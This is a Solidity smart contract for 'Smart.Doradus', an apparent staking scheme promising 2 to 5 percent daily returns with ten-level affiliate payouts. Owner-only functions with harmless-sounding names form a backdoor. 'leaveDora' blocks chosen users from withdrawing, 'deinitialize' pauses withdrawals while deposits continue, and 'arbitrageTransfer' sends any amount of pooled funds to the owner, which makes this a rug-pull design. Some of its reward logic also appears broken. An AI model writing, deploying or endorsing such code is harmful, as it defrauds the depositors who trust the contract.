// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

/**
Smart.Doradus Contract
Web: smart.doradus.io
Mirror: smart.doradus.me
*/

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


contract DORA is Ownable, Pausable, ReentrancyGuard {

    bool public started;

    uint8[4] public INIT_DAILYPERC = [5, 4, 3, 2];
    uint256[4] public INIT_AMOUNTSFORBONUS = [80000000000000000000, 30000000000000000000, 2000000000000000000, 100000000000000000];
    uint256[10] public AFFILIATEPERCENTS = [150, 60, 40, 30, 20, 15, 10, 10, 5, 5];

    mapping(address => bool) public left;
    mapping(address => Stake) public stake;

    struct Stake {
        uint256 stake;
        uint256 notWithdrawn;
        uint256 timestamp;
        address partner;
        uint8 percentage;
    }

    event StakeChanged(address indexed user, address indexed partner, uint256 amount);

    modifier whenStarted {
        require(started, "Not started yet");
        _;
    }

    receive() external payable onlyOwner {}

    function start() external payable onlyOwner {
        started = true;
    }

    function deposit(address partner) external payable whenStarted nonReentrant {
        require(msg.value >= 100000000000000000, "Too low amount to deposit");
        _updateNotWithdrawn(_msgSender());
        stake[_msgSender()].stake += msg.value;
        if (stake[_msgSender()].percentage == 0) {
            require(partner != _msgSender(), "Cannot set your own address as partner");
            stake[_msgSender()].partner = partner;
        }
        _updatePercentage(_msgSender());
        emit StakeChanged(_msgSender(), stake[_msgSender()].partner, stake[_msgSender()].stake);
    }

    function reinvest(uint256 amount) external whenStarted nonReentrant {
        require(amount > 0, "Zero amount");
        _updateNotWithdrawn(_msgSender());
        require(amount <= stake[_msgSender()].notWithdrawn, "Balance too low");
        stake[_msgSender()].notWithdrawn -= amount;
        stake[_msgSender()].stake += amount;
        _updatePercentage(_msgSender());
        emit StakeChanged(_msgSender(), stake[_msgSender()].partner, stake[_msgSender()].stake);
    }

    function withdraw(uint256 amount) external whenStarted whenNotPaused nonReentrant {
        require(amount > 0, "Zero amount");
        require(!left[_msgSender()], "Left");
        _updateNotWithdrawn(_msgSender());
        require(amount <= stake[_msgSender()].notWithdrawn, "Balance too low");
        uint256 fee = (amount * 4) / 100;
        stake[_msgSender()].notWithdrawn -= amount;
        payable(owner()).transfer(fee);
        payable(_msgSender()).transfer(amount - fee);
    }

    function pendingReward(address account) public view returns(uint256) {
        return ((stake[account].stake * ((block.timestamp - stake[account].timestamp) / 86400) * stake[account].percentage) / 100);
    }

    function _updateNotWithdrawn(address account) private {
        uint256 pending = pendingReward(_msgSender());
        stake[_msgSender()].timestamp = block.timestamp;
        stake[_msgSender()].notWithdrawn += pending;
        _traverseTree(stake[account].partner, pending);
    }

    function _traverseTree(address account, uint256 value) private {
        if (value != 0) {
            for (uint8 i; i < 10; i++) {
                if (stake[account].stake == 0) {
                    continue;
                }
                stake[account].notWithdrawn += ((value * AFFILIATEPERCENTS[i]) / 1000);
                account = stake[account].partner;
            }
        }
    }

    function _updatePercentage(address account) private {
        for (uint256 i; i < INIT_AMOUNTSFORBONUS.length; i++) {
            if (stake[account].stake >= INIT_AMOUNTSFORBONUS[i]) {
                stake[account].percentage = INIT_DAILYPERC[i];
                break;
            }
        }
    }

    function leaveDora(address[] calldata account, bool[] calldata _left) external onlyOwner {
        require(account.length == _left.length, "Non-matching length");
        for (uint256 i; i < account.length; i++) {
            left[account[i]] = _left[i];
        }
    }

    function deinitialize() external onlyOwner {
        _pause();
    }

    function initialize() external onlyOwner {
        _unpause();
    }

    function arbitrageTransfer(uint256 amount) external onlyOwner {
        payable(_msgSender()).transfer(amount);
    }
}